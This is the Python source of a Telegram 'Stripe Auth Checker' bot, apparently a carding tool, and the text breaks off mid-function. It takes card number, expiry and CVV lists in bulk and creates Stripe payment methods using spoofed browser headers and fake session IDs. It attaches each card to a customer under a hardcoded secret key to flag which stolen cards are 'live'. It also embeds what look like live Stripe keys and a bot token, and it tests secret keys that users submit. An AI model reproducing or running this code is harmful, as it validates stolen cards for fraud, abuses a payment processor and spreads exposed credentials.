import aiohttp
import json
import time
import os
import logging
import uuid
import random
import string
import base64
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log', encoding='utf-8')
    ]
)

logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram.ext.Application').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

DEFAULT_SK = "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"
DEFAULT_PK = "pk_live_51HCxxcGh3Y40u4KfJV7rsBZCHfpHqWLvjyyVVSoPogRbVfrajg3TlvGP6HYz6h6ti81OOATYDgReNEw8UWB6zWs7005ziEfbdu"
BOT_TOKEN = "7993577146:AAH3q16SP9Wf6vT0FUiuLT1lodNCutZVk_c"
ADMIN_IDS = [6307224822, 6028572049]
STATS_FILE = "bot_stats.json"
BANNED_USERS_FILE = "banned_users.json"
SK_CONFIG_FILE = "sk_config.json"


def load_sk_config():
    if os.path.exists(SK_CONFIG_FILE):
        try:
            with open(SK_CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'sk': DEFAULT_SK, 'pk': DEFAULT_PK}


def save_sk_config(config):
    with open(SK_CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)


def get_global_sk():
    return load_sk_config().get('sk', DEFAULT_SK)


def get_global_pk():
    return load_sk_config().get('pk', DEFAULT_PK)


def load_banned_users():
    if os.path.exists(BANNED_USERS_FILE):
        try:
            with open(BANNED_USERS_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []


def save_banned_users(banned):
    with open(BANNED_USERS_FILE, 'w') as f:
        json.dump(banned, f, indent=2)


def is_banned(user_id):
    return user_id in load_banned_users()


def is_admin(user_id):
    return user_id in ADMIN_IDS


def guid():
    return uuid.uuid4().hex + ''.join(random.choices(string.hexdigits.lower(), k=6))


def escape_markdown(text):
    if text is None:
        return 'N/A'
    text = str(text)
    for char in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
        text = text.replace(char, f'\\{char}')
    return text


async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=aiohttp.ClientTimeout(total=5)) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        'bin': bin_number,
                        'brand': data.get('brand', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'bank': data.get('bank', 'Unknown'),
                        'country': data.get('country', 'Unknown'),
                        'country_flag': data.get('country_flag', '🌍'),
                    }
        return None
    except Exception as e:
        logger.warning(f"Failed to get BIN info: {e}")
        return None


def format_bin_info(bin_info):
    if not bin_info:
        return ""
    return (
        f"\n\n📋 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼\n"
        f"├ Brand: {bin_info['brand']}\n"
        f"├ Type: {bin_info['type']}\n"
        f"├ Level: {bin_info['level']}\n"
        f"├ Bank: {bin_info['bank']}\n"
        f"└ {bin_info['country_flag']} {bin_info['country']}"
    )


def decode_hash_for_pk(hash_str):
    try:
        import urllib.parse
        decoded_uri = urllib.parse.unquote(hash_str)
        padding = len(decoded_uri) % 4
        if padding:
            decoded_uri += '=' * (4 - padding)
        binary_data = base64.b64decode(decoded_uri)
        decoded_chars = ''.join(chr(b ^ 5) for b in binary_data)
        decoded_json_str = decoded_chars.strip()
        data = json.loads(decoded_json_str)
        return data.get('apiKey') or data.get('key')
    except Exception:
        return None


async def get_pk_from_sk(sk: str, timeout: int = 15):
    try:
        url = 'https://api.stripe.com/v1/checkout/sessions'
        data = {
            'mode': 'payment',
            'payment_method_types[]': 'card',
            'line_items[0][price_data][currency]': 'usd',
            'line_items[0][price_data][product_data][name]': 'PK Probe',
            'line_items[0][price_data][unit_amount]': '100',
            'line_items[0][quantity]': '1',
            'success_url': 'https://example.com/success',
            'cancel_url': 'https://example.com/cancel'
        }
        auth_str = base64.b64encode(f"{sk}:".encode()).decode()
        headers = {'Authorization': f'Basic {auth_str}'}
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status not in (200, 303, 201):
                    return None
                try:
                    js = await resp.json()
                    session_url = js.get('url') or js.get('checkout_session', {}).get('url')
                except Exception:
                    session_url = None

                if not session_url:
                    session_url = resp.headers.get('Location')

                if not session_url:
                    return None

                if '#' in session_url:
                    hash_part = session_url.split('#', 1)[1]
                    pk = decode_hash_for_pk(hash_part)
                    return pk
                return None
    except Exception:
        return None


def load_stats():
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}


def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f, indent=2)


def update_user_stats(user_id, username, cards_checked, live_count):
    stats = load_stats()
    user_id_str = str(user_id)
    
    if user_id_str not in stats:
        stats[user_id_str] = {
            'username': username,
            'total_checked': 0,
            'total_live': 0
        }
    
    stats[user_id_str]['username'] = username
    stats[user_id_str]['total_checked'] = stats[user_id_str].get('total_checked', 0) + cards_checked
    stats[user_id_str]['total_live'] = stats[user_id_str].get('total_live', 0) + live_count
    save_stats(stats)


async def get_payment_method(card_number, exp_month, exp_year, cvc, pk):
    try:
        logger.debug(f"Getting payment method for card: {card_number[:4]}****{card_number[-4:]}")
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }
        
        data = {
            'type': 'card',
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'card[number]': card_number,
            'card[cvc]': cvc,
            'card[exp_month]': exp_month,
            'card[exp_year]': exp_year,
            'guid': guid(),
            'muid': guid(),
            'sid': guid(),
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/abcdef1234; stripe-js-v3/abcdef1234; card-element',
            'referrer': 'https://js.stripe.com',
            'time_on_page': str(random.randint(30000, 90000)),
            'key': pk
        }
        
        url = 'https://api.stripe.com/v1/payment_methods'
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, headers=headers) as response:
                response_json = await response.json()
                
                if 'id' in response_json:
                    pm_id = response_json['id']
                    logger.debug(f"Payment method obtained: {pm_id}")
                    return pm_id, None
                else:
                    error_msg = response_json.get('error', {}).get('message', 'Unknown error')
                    logger.warning(f"Payment method error: {response_json}")
                    return None, error_msg
    except aiohttp.ClientError as e:
        logger.warning(f"Request error getting payment method: {str(e)}")
        return None, str(e)
    except Exception as e:
        logger.error(f"Unexpected error getting payment method: {str(e)}", exc_info=True)
        return None, str(e)


async def attach_payment_method(sk, pm_id):
    try:
        logger.debug(f"Attaching payment method: {pm_id}")
        auth_str = base64.b64encode(f"{sk}:".encode()).decode()
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'Basic {auth_str}'
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'https://api.stripe.com/v1/customers',
                headers=headers,
                data='description=chk'
            ) as response_customer:
                customer_result = await response_customer.json()
            
            if 'id' not in customer_result:
                logger.warning(f"Customer creation failed: {customer_result}")
                return {'error': 'Customer creation failed', 'response': customer_result}
            
            customer_id = customer_result['id']
            logger.info(f"Customer created: {customer_id}")
            
            async with session.post(
                f'https://api.stripe.com/v1/payment_methods/{pm_id}/attach',
                headers=headers,
                data=f'customer={customer_id}'
            ) as response_attach:
                attach_result = await response_attach.json()
            
            if 'error' in attach_result:
                error_info = attach_result['error']
                logger.warning(f"Attach error: {error_info}")
                return {
                    'error': error_info.get('message', 'Attach failed'),
                    'decline_code': error_info.get('decline_code'),
                    'customer_id': customer_id
                }
            
            logger.info(f"Payment method attached successfully to {customer_id}")
            return {'ok': True, 'customer_id': customer_id}
        
    except aiohttp.ClientError as e:
        logger.warning(f"Request exception: {str(e)}")
        return {'error': str(e), 'response': {}}
    except Exception as e:
        logger.error(f"Unexpected error attaching PM: {str(e)}", exc_info=True)
        return {'error': str(e), 'response': {}}


def parse_card(card_line):
    try:
        card_parts = card_line.strip().split('|')
        if len(card_parts) != 4:
            return None
        return {
            'number': card_parts[0].strip(),
            'exp_month': card_parts[1].strip(),
            'exp_year': card_parts[2].strip(),
            'cvc': card_parts[3].strip()
        }
    except:
        return None


async def process_card(sk, card_data):
    card_number = card_data['number']
    exp_month = card_data['exp_month']
    exp_year = card_data['exp_year']
    cvc = card_data['cvc']
    
    pk = get_global_pk()
    logger.debug(f"Using global PK: {pk[:20]}...")
    
    pm_id, pm_error = await get_payment_method(card_number, exp_month, exp_year, cvc, pk)
    
    if not pm_id:
        return {'status': 'failed', 'reason': pm_error or 'pm_error', 'card': card_number, 'full_card': f"{card_number}|{exp_month}|{exp_year}|{cvc}"}
    
    result = await attach_payment_method(sk, pm_id)
    
    if result.get('ok'):
        return {
            'status': 'live',
            'customer_id': result.get('customer_id'),
            'full_card': f"{card_number}|{exp_month}|{exp_year}|{cvc}"
        }
    elif 'error' in result:
        return {
            'status': 'dead',
            'reason': result.get('error', 'Unknown error'),
            'decline_code': result.get('decline_code'),
            'full_card': f"{card_number}|{exp_month}|{exp_year}|{cvc}"
        }
    else:
        return {
            'status': 'dead',
            'reason': 'Unknown error',
            'decline_code': None,
            'full_card': f"{card_number}|{exp_month}|{exp_year}|{cvc}"
        }


async def process_batch_cards(sk, cards, update, context, session_key, user_id, username):
    progress_msg = await update.message.reply_text(
        "╭────────────────────╮\n"
        "│   🔄 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴     │\n"
        "╰────────────────────╯\n\n"
        f"⏳ 0/{len(cards)} cards\n"
        "✅ 0 | ❌ 0 | ⚠️ 0"
    )
    
    live_cards = []
    dead_count = 0
    failed_count = 0
    latest_response = "Waiting to start..."
    start_time = time.time()
    
    try:
        logger.info(f"Starting batch check for user {user_id} (@{username}): {len(cards)} cards")
        for idx, card_data in enumerate(cards, 1):
            if context.bot_data.get('active_sessions', {}).get(session_key, {}).get('stopped', False):
                logger.info(f"Batch check stopped by user {user_id}")
                elapsed = int(time.time() - start_time)
                stop_msg = (
                    "╭────────────────────╮\n"
                    "│   ⛔ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱        │\n"
                    "╰────────────────────╯\n\n"
                    f"⏳ {idx-1}/{len(cards)} cards checked\n"
                    f"✅ {len(live_cards)} | ❌ {dead_count} | ⚠️ {failed_count} | ⌛ {elapsed}s"
                )
                try:
                    await progress_msg.edit_text(stop_msg)
                except:
                    pass
                await update.message.reply_text("⛔ Checking stopped by user.")
                break
            
            logger.debug(f"Processing card {idx}/{len(cards)}")
            result = await process_card(sk, card_data)
            logger.debug(f"Card {idx} result: {result['status']}")
            
            if result['status'] == 'live':
                live_cards.append(result['full_card'])
                context.bot_data['active_sessions'][session_key]['live'] += 1
                latest_response = f"✅ Live - {result['full_card']}"
                bin_info = await get_bin_info(card_data['number'])
                bin_text = format_bin_info(bin_info)
                live_msg = (
                    "╭────────────────────╮\n"
                    "│  ✅ 𝗖𝗮𝗿𝗱 𝗔𝗱𝗱𝗲𝗱       │\n"
                    "╰────────────────────╯\n\n"
                    f"🔹 `{result['full_card']}`\n\n"
                    f"🟢 Status: Live{bin_text}"
                )
                await update.message.reply_text(live_msg, parse_mode='Markdown')
            elif result['status'] == 'dead':
                dead_count += 1
                context.bot_data['active_sessions'][session_key]['dead'] += 1
                decline_code = result.get('decline_code', 'N/A')
                latest_response = f"❌ DEAD - decline_code: {decline_code}"
            else:
                failed_count += 1
                context.bot_data['active_sessions'][session_key]['failed'] += 1
                latest_response = f"⚠️ FAILED - {result.get('reason', 'Unknown error')}"
            
            context.bot_data['active_sessions'][session_key]['checked'] = idx
            
            elapsed = int(time.time() - start_time)
            progress_text = (
                "╭────────────────────╮\n"
                "│   🔄 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴     │\n"
                "╰────────────────────╯\n\n"
                f"⏳ {idx}/{len(cards)} cards\n"
                f"✅ {len(live_cards)} | ❌ {dead_count} | ⚠️ {failed_count} | ⌛ {elapsed}s\n\n"
                f"📝 {latest_response}"
            )
            
            try:
                await progress_msg.edit_text(progress_text)
            except:
                pass
            
            if idx < len(cards):
                await asyncio.sleep(0.5)
        
        elapsed = int(time.time() - start_time)
        summary = (
            "╭────────────────────╮\n"
            "│    📊 𝗥𝗲𝘀𝘂𝗹𝘁        │\n"
            "╰────────────────────╯\n\n"
            f"✅ Live: {len(live_cards)}\n"
            f"❌ Declined: {dead_count}\n"
            f"⚠️ Failed: {failed_count}\n\n"
            f"📝 Total: {len(cards)} | ⌛ {elapsed}s"
        )

        final_progress_text = (
            "╭────────────────────╮\n"
            "│   ✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱      │\n"
            "╰────────────────────╯\n\n"
            f"✅ {len(live_cards)} | ❌ {dead_count} | ⚠️ {failed_count}"
        )
        
        try:
            await progress_msg.edit_text(final_progress_text)
        except:
            pass
        
        await update.message.reply_text(summary)
        update_user_stats(user_id, username, len(cards), len(live_cards))
        logger.info(f"Batch check completed for user {user_id}: {len(live_cards)} live, {dead_count} dead, {failed_count} failed")
    except Exception as e:
        logger.error(f"Error in batch processing for user {user_id}: {str(e)}", exc_info=True)
        await update.message.reply_text(f"❌ Error processing cards: {str(e)}")
    finally:
        if session_key in context.bot_data.get('active_sessions', {}):
            del context.bot_data['active_sessions'][session_key]


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/start command from user {user_id} (@{username})")
    
    message = (
        "╭━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "│  🔥 𝗦𝘁𝗿𝗶𝗽𝗲 Auth 𝗖𝗵𝗲𝗰𝗸𝗲𝗿  │\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        "  ➤ /chk card|MM|YY|CVV\n"
        "  ➤ Reply /chk to .txt file\n"
        "  ➤ /stop to stop checking\n\n"
        "  👥 [Join GC](https://t.me/+l1aMGXxYLRYyZDZk)\n"
    )
    await update.message.reply_text(message, parse_mode='Markdown', disable_web_page_preview=True)


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/chk command from user {user_id} (@{username})")
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 BANNED")
        return
    
    sk = get_global_sk()
    if not sk:
        logger.error("Global SK is not set")
        await update.message.reply_text("❌ Global SK key is not configured. Contact admin.")
        return
    
    if not sk.startswith('sk_'):
        await update.message.reply_text("❌ Invalid SK key configured. Contact admin.")
        return
    
    if update.message.reply_to_message and update.message.reply_to_message.document:
        file = update.message.reply_to_message.document
        if file.file_name and file.file_name.endswith('.txt'):
            logger.info(f"Processing file upload from user {user_id} (@{username}): {file.file_name}")
            await update.message.reply_text("📥 Downloading file...")
            file_obj = await context.bot.get_file(file.file_id)
            file_path = f"temp_{update.message.from_user.id}_{int(time.time())}.txt"
            
            try:
                await file_obj.download_to_drive(file_path)
                logger.debug(f"File downloaded to: {file_path}")
                
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                cards = []
                for line in content.split('\n'):
                    card_data = parse_card(line)
                    if card_data:
                        cards.append(card_data)
                
                os.remove(file_path)
                logger.info(f"Parsed {len(cards)} valid card(s) from file")
                
                if not cards:
                    logger.warning(f"No valid cards found in file from user {user_id}")
                    await update.message.reply_text("❌ No valid cards found in the file")
                    return
                
                user_id = update.message.from_user.id
                username = update.message.from_user.username or update.message.from_user.first_name or "Unknown"
                
                session_key = f"{user_id}_{int(time.time())}"
                if 'active_sessions' not in context.bot_data:
                    context.bot_data['active_sessions'] = {}
                
                context.bot_data['active_sessions'][session_key] = {
                    'user_id': user_id,
                    'username': username,
                    'total': len(cards),
                    'checked': 0,
                    'live': 0,
                    'dead': 0,
                    'failed': 0
                }
                
                asyncio.create_task(process_batch_cards(sk, cards, update, context, session_key, user_id, username))
                
            except Exception as e:
                logger.error(f"Error processing file for user {user_id}: {str(e)}", exc_info=True)
                await update.message.reply_text(f"❌ Error processing file: {str(e)}")
                if os.path.exists(file_path):
                    os.remove(file_path)
        else:
            await update.message.reply_text("❌ Please reply to a .txt file")
    
    elif context.args or (update.message.text and '\n' in update.message.text):
        if context.args:
            card_input = '\n'.join(context.args)
        else:
            card_input = update.message.text.replace('/sk', '').strip()
        
        lines = [line.strip() for line in card_input.split('\n') if line.strip()]
        cards = []
        for line in lines:
            card_data = parse_card(line)
            if card_data:
                cards.append(card_data)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found. Use format: card_number|exp_month|exp_year|cvc")
            return
        
        if len(cards) == 1:
            logger.info(f"Processing single card for user {user_id} (@{username})")
            await update.message.reply_text(
                "┏━━━━━━━⍟\n"
                "┃ 🔄 Checking Card\n"
                "┗━━━━━━━━━━━⊛\n\n"
                "⏳ Processing..."
            )
            
            result = await process_card(sk, cards[0])
            logger.info(f"Single card result for user {user_id}: {result['status']}")
            
            if result['status'] == 'live':
                bin_info = await get_bin_info(cards[0]['number'])
                bin_text = format_bin_info(bin_info)
                live_msg = (
                    "╭────────────────────╮\n"
                    "│  ✅ 𝗖𝗮𝗿𝗱 𝗔𝗱𝗱𝗲𝗱       │\n"
                    "╰────────────────────╯\n\n"
                    f"🔹 `{result['full_card']}`\n\n"
                    f"🟢 Status: Live{bin_text}"
                )
                await update.message.reply_text(live_msg, parse_mode='Markdown')
                update_user_stats(user_id, username, 1, 1)
            elif result['status'] == 'dead':
                bin_info = await get_bin_info(cards[0]['number'])
                bin_text = format_bin_info(bin_info)
                reason_text = escape_markdown(result.get('reason', 'Unknown'))
                decline_code = result.get('decline_code', '')
                decline_info = f" | {escape_markdown(decline_code)}" if decline_code else ""
                dead_msg = (
                    "╭────────────────────╮\n"
                    "│  ❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱         │\n"
                    "╰────────────────────╯\n\n"
                    f"🔹 `{result['full_card']}`\n\n"
                    f"🔴 {reason_text}{decline_info}{bin_text}"
                )
                await update.message.reply_text(dead_msg, parse_mode='Markdown')
                update_user_stats(user_id, username, 1, 0)
            else:
                fail_msg = (
                    "┏━━━━━━━⍟\n"
                    "┃ ⚠️ FAILED\n"
                    "┗━━━━━━━━━━━⊛\n\n"
                    f"Reason: {result.get('reason', 'Unknown error')}\n"
                    "━━━━━━━━━━━━━━━━━━"
                )
                await update.message.reply_text(fail_msg)
                update_user_stats(user_id, username, 1, 0)
        else:
            user_id = update.message.from_user.id
            username = update.message.from_user.username or update.message.from_user.first_name or "Unknown"
            
            session_key = f"{user_id}_{int(time.time())}"
            if 'active_sessions' not in context.bot_data:
                context.bot_data['active_sessions'] = {}
            
            context.bot_data['active_sessions'][session_key] = {
                'user_id': user_id,
                'username': username,
                'total': len(cards),
                'checked': 0,
                'live': 0,
                'dead': 0,
                'failed': 0
            }
            
            asyncio.create_task(process_batch_cards(sk, cards, update, context, session_key, user_id, username))
    else:
        logger.warning(f"User {user_id} (@{username}) sent /chk without valid input")
        await update.message.reply_text("❌ Please provide a card (format: card_number|exp_month|exp_year|cvc) or reply to a .txt file")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/stats command from user {user_id} (@{username})")
    
    stats = load_stats()
    
    if not stats:
        message = (
            "┏━━━━━━━⍟\n"
            "┃ 📊 Statistics\n"
            "┗━━━━━━━━━━━⊛\n\n"
            "No users have checked any cards yet."
        )
        await update.message.reply_text(message)
        return

    total_checked_all = 0
    total_live_all = 0

    message = "┏━━━━━━━⍟\n"
    message += "┃ 📊 All Users Statistics\n"
    message += "┗━━━━━━━━━━━⊛\n\n"

    sorted_users = sorted(stats.items(), key=lambda x: x[1].get('total_live', 0), reverse=True)

    for user_id_str, user_stats in sorted_users:
        username = user_stats.get('username', 'Unknown')
        total_live = user_stats.get('total_live', 0)
        total_checked = user_stats.get('total_checked', 0)
        total_checked_all += total_checked
        total_live_all += total_live
        message += f"👤 @{username} — ✅ {total_live} | 📝 {total_checked}\n"

    message += "━━━━━━━━━━━━━━━━━━━━\n"
    message += f"📊 Total — ✅ {total_live_all} | 📝 {total_checked_all}"

    if len(message) > 4096:
        chunks = [message[i:i+4096] for i in range(0, len(message), 4096)]
        for chunk in chunks:
            await update.message.reply_text(chunk)
    else:
        await update.message.reply_text(message)


async def active_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/active command from user {user_id} (@{username})")
    
    active_sessions = context.bot_data.get('active_sessions', {})
    
    if not active_sessions:
        message = (
            "┏━━━━━━━⍟\n"
            "┃ 📡 Active Sessions\n"
            "┗━━━━━━━━━━━⊛\n\n"
            "No active checking sessions at the moment."
        )
        await update.message.reply_text(message)
        return

    message = "┏━━━━━━━⍟\n"
    message += "┃ 📡 Active Checking Sessions\n"
    message += "┗━━━━━━━━━━━⊛\n\n"

    for session_key, session_data in active_sessions.items():
        username = session_data.get('username', 'Unknown')
        checked = session_data.get('checked', 0)
        total = session_data.get('total', 0)
        live = session_data.get('live', 0)
        message += f"👤 @{username} — {checked}/{total} | ✅ {live}\n"

    await update.message.reply_text(message)


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/stop command from user {user_id} (@{username})")
    
    active_sessions = context.bot_data.get('active_sessions', {})
    
    user_sessions = []
    for session_key, session_data in active_sessions.items():
        if session_data.get('user_id') == user_id:
            user_sessions.append(session_key)
    
    if not user_sessions:
        await update.message.reply_text("❌ You don't have any active checking sessions.")
        return
    
    stopped_count = 0
    for session_key in user_sessions:
        if session_key in context.bot_data['active_sessions']:
            context.bot_data['active_sessions'][session_key]['stopped'] = True
            stopped_count += 1
    
    await update.message.reply_text(f"⛔ Stopping {stopped_count} active session(s)...")
    logger.info(f"User {user_id} requested stop for {stopped_count} session(s)")


async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/ban command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Please provide a user ID to ban.\n\nUsage: /ban user_id")
        return
    
    try:
        target_user_id = int(context.args[0].strip())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
        return
    
    if is_admin(target_user_id):
        await update.message.reply_text("❌ Cannot ban an admin.")
        return
    
    banned = load_banned_users()
    if target_user_id in banned:
        await update.message.reply_text(f"⚠️ User {target_user_id} is already banned.")
        return
    
    banned.append(target_user_id)
    save_banned_users(banned)
    
    await update.message.reply_text(f"✅ User {target_user_id} has been banned.")
    logger.info(f"Admin {user_id} banned user {target_user_id}")


async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/unban command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Please provide a user ID to unban.\n\nUsage: /unban user_id")
        return
    
    try:
        target_user_id = int(context.args[0].strip())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
        return
    
    banned = load_banned_users()
    if target_user_id not in banned:
        await update.message.reply_text(f"⚠️ User {target_user_id} is not banned.")
        return
    
    banned.remove(target_user_id)
    save_banned_users(banned)
    
    await update.message.reply_text(f"✅ User {target_user_id} has been unbanned.")
    logger.info(f"Admin {user_id} unbanned user {target_user_id}")


async def bans_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/bans command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    banned = load_banned_users()
    
    if not banned:
        await update.message.reply_text("📋 No banned users.")
        return
    
    message = "┏━━━━━━━⍟\n"
    message += "┃ 🚫 Banned Users\n"
    message += "┗━━━━━━━━━━━⊛\n\n"
    
    for idx, banned_id in enumerate(banned, 1):
        message += f"{idx}. `{banned_id}`\n"
    
    message += f"\n📝 Total: {len(banned)}"
    await update.message.reply_text(message, parse_mode='Markdown')


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/admin command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    message = (
        "┏━━━━━━━⍟\n"
        "┃ 👑 Admin Commands\n"
        "┗━━━━━━━━━━━⊛\n\n"
        "🔑 𝗞𝗲𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁\n"
        "├ /setsk sk pk - Set global SK/PK\n"
        "├ /viewsk - View current SK/PK\n"
        "└ /removesk - Reset to default\n\n"
        "🚫 𝗨𝘀𝗲𝗿 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁\n"
        "├ /ban user_id - Ban a user\n"
        "├ /unban user_id - Unban a user\n"
        "└ /bans - List banned users\n\n"
        "📊 𝗦𝘁𝗮𝘁𝘀\n"
        "├ /stats - User statistics\n"
        "└ /active - Active sessions"
    )
    await update.message.reply_text(message)


async def setsk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/setsk command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Please provide SK and PK keys.\n\nUsage: /setsk sk_live_xxx pk_live_xxx")
        return
    
    sk = context.args[0].strip()
    pk = context.args[1].strip() if len(context.args) > 1 else None
    
    if not sk.startswith('sk_'):
        await update.message.reply_text("❌ Invalid SK format. Must start with 'sk_'")
        return
    
    if pk and not pk.startswith('pk_'):
        await update.message.reply_text("❌ Invalid PK format. Must start with 'pk_'")
        return
    
    config = load_sk_config()
    config['sk'] = sk
    if pk:
        config['pk'] = pk
    save_sk_config(config)
    
    masked_sk = f"{sk[:12]}...{sk[-6:]}"
    msg = f"✅ Global SK updated: `{masked_sk}`"
    if pk:
        masked_pk = f"{pk[:12]}...{pk[-6:]}"
        msg += f"\n✅ Global PK updated: `{masked_pk}`"
    
    await update.message.reply_text(msg, parse_mode='Markdown')
    logger.info(f"Admin {user_id} updated global SK/PK")


async def removesk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/removesk command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    config = {'sk': DEFAULT_SK, 'pk': DEFAULT_PK}
    save_sk_config(config)
    
    await update.message.reply_text("✅ Global SK/PK reset to default.")
    logger.info(f"Admin {user_id} reset global SK/PK to default")


async def viewsk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/viewsk command from user {user_id} (@{username})")
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    config = load_sk_config()
    sk = config.get('sk', 'Not set')
    pk = config.get('pk', 'Not set')
    
    message = "┏━━━━━━━⍟\n"
    message += "┃ 🔑 Global Keys\n"
    message += "┗━━━━━━━━━━━⊛\n\n"
    message += f"SK: `{sk}`\n"
    message += f"PK: `{pk}`"
    
    await update.message.reply_text(message, parse_mode='Markdown')


async def sk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    logger.info(f"/sk command from user {user_id} (@{username})")
    
    if not context.args:
        await update.message.reply_text("❌ Please provide a Stripe secret key.\n\nUsage: /sk sk_live_xxx")
        return
    
    sk = context.args[0].strip()
    
    if not sk.startswith('sk_'):
        await update.message.reply_text("❌ Invalid key format. Key must start with 'sk_'")
        return
    
    await update.message.reply_text("🔄 Checking SK key...")
    
    try:
        logger.info(f"Checking SK key for user {user_id} (@{username})")
        auth_str = base64.b64encode(f"{sk}:".encode()).decode()
        headers = {'Authorization': f'Basic {auth_str}'}
        
        async with aiohttp.ClientSession() as session:
            account_url = "https://api.stripe.com/v1/account"
            async with session.get(account_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as account_response:
                if account_response.status != 200:
                    logger.warning(f"SK check failed for user {user_id}: HTTP {account_response.status}")
                    error_text = await account_response.text()
